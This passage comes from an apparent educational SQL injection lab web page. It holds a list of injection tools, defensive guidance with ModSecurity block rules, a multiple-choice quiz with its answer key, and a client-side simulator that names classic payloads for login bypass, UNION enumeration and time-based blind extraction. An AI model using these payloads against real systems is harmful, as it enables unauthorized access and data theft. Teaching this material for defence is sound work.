                        <li>SQL Injection (MySQL)</li>
                        <li>SQL Injection (Oracle)</li>
                        <li>SQL Injection (PostgreSQL)</li>
                    </ul>
                </div>
            </div>

            <div class="tool-card">
                <h4>Other Useful Tools</h4>
                <table class="table">
                    <thead>
                        <tr>
                            <th>Tool</th>
                            <th>Purpose</th>
                            <th>Best For</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>jSQL Injection</td>
                            <td>GUI-based SQLi tool</td>
                            <td>Beginners, visual interface</td>
                        </tr>
                        <tr>
                            <td>NoSQLMap</td>
                            <td>NoSQL injection</td>
                            <td>MongoDB, CouchDB testing</td>
                        </tr>
                        <tr>
                            <td>Havij</td>
                            <td>Automated SQLi</td>
                            <td>Windows users, GUI</td>
                        </tr>
                        <tr>
                            <td>BBQSQL</td>
                            <td>Blind SQLi framework</td>
                            <td>Time-based exploitation</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </section>

        <section class="section">
            <h2>Defense Mechanisms</h2>
            <p>Protecting applications from SQL injection requires multiple layers of defense:</p>

            <h3>1. Parameterized Queries (Prepared Statements)</h3>
            <p>The most effective defense. Separates SQL logic from data.</p>

            <div class="code-block">
                <code>
<span class="sql-comment">// VULNERABLE CODE (PHP)</span>
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

<span class="sql-comment">// SECURE CODE (PHP with PDO)</span>
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);

<span class="sql-comment">// SECURE CODE (Python)</span>
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))

<span class="sql-comment">// SECURE CODE (Java)</span>
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=? AND password=?");
stmt.setString(1, username);
stmt.setString(2, password);
                </code>
            </div>

            <h3>2. Input Validation</h3>
            <div class="technique-box">
                <h4>Whitelist Validation</h4>
                <p>Only allow known-good characters. For example, if expecting a number, only allow digits:</p>
                <div class="code-block">
                    <code>
<span class="sql-comment">// PHP example</span>
if (!preg_match('/^[0-9]+$/', $id)) {
    die("Invalid ID");
}

<span class="sql-comment">// Python example</span>
if not id.isdigit():
    raise ValueError("Invalid ID")
                    </code>
                </div>
            </div>

            <div class="technique-box">
                <h4>Escape Special Characters</h4>
                <p>If parameterized queries aren't possible (legacy code), escape special characters:</p>
                <div class="code-block">
                    <code>
<span class="sql-comment">// PHP</span>
$username = mysqli_real_escape_string($conn, $username);

<span class="sql-comment">// Note: This is NOT recommended as primary defense!</span>
                    </code>
                </div>
            </div>

            <h3>3. Least Privilege Principle</h3>
            <ul>
                <li>Database user should have minimum necessary permissions</li>
                <li>Don't use 'root' or 'sa' accounts for web applications</li>
                <li>Restrict access to system tables (information_schema)</li>
                <li>Disable dangerous functions (LOAD_FILE, xp_cmdshell)</li>
            </ul>

            <h3>4. Web Application Firewall (WAF)</h3>
            <div class="code-block">
                <code>
<span class="sql-comment"># ModSecurity Rule Examples</span>
SecRule ARGS "@detectSQLi" "deny,status:403,msg:'SQL Injection Attempt'"

<span class="sql-comment"># Block common SQLi patterns</span>
SecRule ARGS "@rx (\bunion\b.*\bselect\b|\bor\b.*=.*)" "deny"
                </code>
            </div>

            <h3>5. Error Handling</h3>
            <ul>
                <li>Never display database errors to users</li>
                <li>Log errors server-side for debugging</li>
                <li>Return generic error messages to users</li>
                <li>Disable verbose error reporting in production</li>
            </ul>

            <div class="info-callout">
                <strong>Defense in Depth:</strong> Use multiple security layers. Even if one fails, others provide protection.
            </div>
        </section>

        <div class="quiz-container">
            <h2>Knowledge Assessment Quiz</h2>
            <p style="color: #d1d5db; margin-bottom: 20px;">
                Test your understanding of SQL injection concepts. Select the best answer for each question.
            </p>

            <div id="quiz"></div>

            <button class="submit-btn" onclick="gradeQuiz()" style="margin-top: 20px; background: linear-gradient(135deg, #10b981 0%, #059669 100%);">
                Submit Quiz
            </button>

            <div id="quizResult" class="quiz-result"></div>
        </div>

        <footer style="text-align: center; margin-top: 40px;">
            <a href="../index.html" class="back-link">Return to Dark Arts Vault</a>
        </footer>
    </div>

    <script src="../../components/AccessGuard.js"></script>
    <script>AccessGuard.require('sorted');</script>
    <script src="../../components/AchievementManager.js"></script>
    <script src="../../components/ModuleProgress.js"></script>

    <script>
        // Quiz Questions
        const quizQuestions = [
            {
                question: "What is the primary cause of SQL injection vulnerabilities?",
                options: [
                    "Using outdated database software",
                    "Inserting user input directly into SQL queries without sanitization",
                    "Not using HTTPS encryption",
                    "Weak password policies"
                ],
                correct: 1
            },
            {
                question: "Which payload would most likely bypass a vulnerable login form?",
                options: [
                    "admin:password123",
                    "' OR '1'='1' --",
                    "<script>alert('XSS')</script>",
                    "../../../../etc/passwd"
                ],
                correct: 1
            },
            {
                question: "What is the purpose of the ORDER BY clause in SQL injection enumeration?",
                options: [
                    "To sort results alphabetically",
                    "To determine the number of columns in the query",
                    "To bypass authentication",
                    "To execute multiple queries"
                ],
                correct: 1
            },
            {
                question: "In blind SQL injection, what indicates a successful time-based attack?",
                options: [
                    "Error messages are displayed",
                    "The page loads instantly",
                    "The server response is delayed by the specified time",
                    "User data is displayed on the page"
                ],
                correct: 2
            },
            {
                question: "What SQL operator is used in UNION-based SQL injection?",
                options: [
                    "JOIN",
                    "UNION",
                    "MERGE",
                    "COMBINE"
                ],
                correct: 1
            },
            {
                question: "What is the most effective defense against SQL injection?",
                options: [
                    "Using a Web Application Firewall (WAF)",
                    "Implementing parameterized queries (prepared statements)",
                    "Escaping special characters with backslashes",
                    "Limiting the length of user input"
                ],
                correct: 1
            },
            {
                question: "Which MySQL function can be exploited to read files from the server?",
                options: [
                    "READ_FILE()",
                    "LOAD_FILE()",
                    "GET_FILE()",
                    "FETCH_FILE()"
                ],
                correct: 1
            },
            {
                question: "What does the 'information_schema' database contain?",
                options: [
                    "User passwords and credentials",
                    "System configuration files",
                    "Metadata about all databases, tables, and columns",
                    "Web server access logs"
                ],
                correct: 2
            }
        ];

        let userAnswers = [];
        let labProgress = {
            sectionsRead: new Set(),
            interactionCompleted: false,
            quizCompleted: false
        };

        // Initialize quiz
        function initQuiz() {
            const quizContainer = document.getElementById('quiz');
            quizContainer.innerHTML = '';

            quizQuestions.forEach((q, index) => {
                const questionDiv = document.createElement('div');
                questionDiv.className = 'question';
                questionDiv.innerHTML = `
                    <h4>Question ${index + 1}: ${q.question}</h4>
                    ${q.options.map((option, optIndex) => `
                        <div class="option" onclick="selectOption(${index}, ${optIndex}, this)">
                            ${String.fromCharCode(65 + optIndex)}. ${option}
                        </div>
                    `).join('')}
                `;
                quizContainer.appendChild(questionDiv);
            });
        }

        // Handle option selection
        function selectOption(questionIndex, optionIndex, element) {
            // Remove selection from other options in this question
            const question = element.parentElement;
            question.querySelectorAll('.option').forEach(opt => opt.classList.remove('selected'));

            // Mark this option as selected
            element.classList.add('selected');
            userAnswers[questionIndex] = optionIndex;
        }

        // Grade the quiz
        function gradeQuiz() {
            if (userAnswers.length !== quizQuestions.length) {
                alert('Please answer all questions before submitting.');
                return;
            }

            let correct = 0;
            quizQuestions.forEach((q, index) => {
                const questionDiv = document.querySelectorAll('.question')[index];
                const options = questionDiv.querySelectorAll('.option');

                options.forEach((opt, optIndex) => {
                    opt.classList.remove('selected');
                    if (optIndex === q.correct) {
                        opt.classList.add('correct');
                    } else if (optIndex === userAnswers[index]) {
                        opt.classList.add('incorrect');
                    }
                });

                if (userAnswers[index] === q.correct) {
                    correct++;
                }
            });

            const percentage = (correct / quizQuestions.length * 100).toFixed(0);
            const resultDiv = document.getElementById('quizResult');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = `
                <h3>Quiz Results</h3>
                <p style="font-size: 2em; color: ${percentage >= 70 ? '#10b981' : '#dc2626'};">
                    ${correct} / ${quizQuestions.length} (${percentage}%)
                </p>
                <p>${percentage >= 70 ?
                    'Excellent work! You have a strong understanding of SQL injection.' :
                    'Review the material and try again. You need 70% to pass.'}
                </p>
            `;

            if (percentage >= 70) {
                labProgress.quizCompleted = true;
                updateProgress();

                // Save progress and unlock achievement
                if (typeof ModuleProgress !== 'undefined') {
                    ModuleProgress.complete('sql-injection-lab');
                }

                if (typeof AchievementManager !== 'undefined') {
                    AchievementManager.unlock('dark-arts-sql-injection');
                }
            }

            // Scroll to results
            resultDiv.scrollIntoView({ behavior: 'smooth' });
        }

        // Copy code to clipboard
        function copyCode(button) {
            const codeBlock = button.parentElement;
            const code = codeBlock.querySelector('code').innerText;
            navigator.clipboard.writeText(code).then(() => {
                const originalText = button.innerText;
                button.innerText = 'Copied!';
                setTimeout(() => {
                    button.innerText = originalText;
                }, 2000);
            });
        }

        // Copy payload
        function copyPayload(card) {
            const codes = card.querySelectorAll('code');
            const text = Array.from(codes).map(c => c.innerText).join('\n');
            navigator.clipboard.writeText(text).then(() => {
                const originalBorder = card.style.borderColor;
                card.style.borderColor = '#10b981';
                setTimeout(() => {
                    card.style.borderColor = originalBorder;
                }, 1000);
            });
        }

        // Tab switching
        function switchTab(tabId) {
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');

            // Update tab content
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(tabId).classList.add('active');
        }

        // Interactive SQL injection simulator
        function testInjection() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const responseBox = document.getElementById('responseBox');

            responseBox.style.display = 'block';
            responseBox.className = 'response-box';

            // Simulate SQL query
            const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;

            // Check for various injection patterns
            if (username.includes("' OR '1'='1") || username.includes("' OR 1=1") ||
                username.includes("admin' --") || username.includes("admin' #")) {
                responseBox.classList.add('success');
                responseBox.innerHTML = `
<strong>SQL INJECTION SUCCESSFUL!</strong>

Constructed Query:
${query}

Evaluated As:
SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'

Result: Authentication BYPASSED
Logged in as: admin (first user in database)

Returned Data:
+----+----------+------------------+-------+
| id | username | email            | role  |
+----+----------+------------------+-------+
| 1  | admin    | admin@example.com| admin |
+----+----------+------------------+-------+

Impact: Complete authentication bypass!
`;
                labProgress.interactionCompleted = true;
                updateProgress();
            } else if (username.includes('UNION SELECT')) {
                responseBox.classList.add('error');
                responseBox.innerHTML = `
<strong>SQL INJECTION DETECTED (UNION-based)</strong>

Constructed Query:
${query}

Error: The used SELECT statements have different number of columns

Analysis: This is a UNION-based injection attempt. You need to:
1. Determine the correct number of columns with ORDER BY
2. Match the column count in your UNION SELECT
3. Identify which columns display data

Try: ' UNION SELECT 1,2,3 --
(Adjust the number of columns based on ORDER BY results)
`;
            } else if (username.includes('SLEEP') || username.includes('WAITFOR')) {
                responseBox.classList.add('success');
                responseBox.innerHTML = `
<strong>TIME-BASED BLIND SQL INJECTION</strong>

Constructed Query:
${query}

Result: Server response delayed by specified time
Status: VULNERABLE to time-based blind SQLi

This indicates you can extract data using time delays:
- If condition is TRUE: delay occurs
- If condition is FALSE: no delay

Example: Extract database name character by character
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
`;
            } else if (username.includes('AND 1=1')) {
                responseBox.classList.add('success');
                responseBox.innerHTML = `
<strong>BOOLEAN-BASED BLIND SQL INJECTION (TRUE)</strong>

Constructed Query:
${query}

Result: Normal page response (TRUE condition)
Status: VULNERABLE to boolean-based blind SQLi

Compare this response with:
' AND 1=2 -- (should show different response)

You can extract data by asking TRUE/FALSE questions.
`;
            } else if (username.includes('AND 1=2')) {
                responseBox.classList.add('error');
                responseBox.innerHTML = `
<strong>BOOLEAN-BASED BLIND SQL INJECTION (FALSE)</strong>

Constructed Query:
${query}

Result: No results returned (FALSE condition)
Status: VULNERABLE to boolean-based blind SQLi

This different response confirms the vulnerability.
You can use this technique to extract data bit by bit.
`;
            } else if (username.includes("'")) {
                responseBox.classList.add('error');
                responseBox.innerHTML = `
<strong>SQL SYNTAX ERROR</strong>

Constructed Query:
${query}

Error: You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax to use
near ''${username}'' at line 1

Analysis: Single quote caused syntax error - VULNERABLE!
The application is likely susceptible to SQL injection.

Next steps:
- Try: ' OR '1'='1' --
- Try: admin' --
- Try: ' UNION SELECT 1,2,3 --
`;
            } else {
                responseBox.classList.add('error');
                responseBox.innerHTML = `
<strong>LOGIN FAILED</strong>

Constructed Query:
${query}

Result: Invalid credentials
Status: No SQL injection detected

Try injecting SQL payloads:
- ' OR '1'='1' --
- admin' --
- ' UNION SELECT 1,2,3 --
`;
            }
        }

        function resetForm() {
            document.getElementById('vulnForm').reset();
            document.getElementById('responseBox').style.display = 'none';
        }

        // Update progress bar
        function updateProgress() {
            let progress = 0;

            // 30% for interaction
            if (labProgress.interactionCompleted) progress += 30;

            // 70% for quiz
            if (labProgress.quizCompleted) progress += 70;

            const progressBar = document.getElementById('progressBar');
            progressBar.style.width = progress + '%';
            progressBar.textContent = progress + '%';

            if (progress === 100) {
                progressBar.textContent = '100% - Complete!';
            }
        }

        // Track section reading
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    labProgress.sectionsRead.add(entry.target);
                    updateProgress();
                }
            });
        }, { threshold: 0.5 });

        // Observe all sections
        document.querySelectorAll('.section').forEach(section => {
            observer.observe(section);
        });

        // Initialize on load
        window.addEventListener('DOMContentLoaded', () => {
            initQuiz();
            updateProgress();
        });
    </script>
<script src="../../components/FluxCapacitor.js"></script>
</body>
</html>
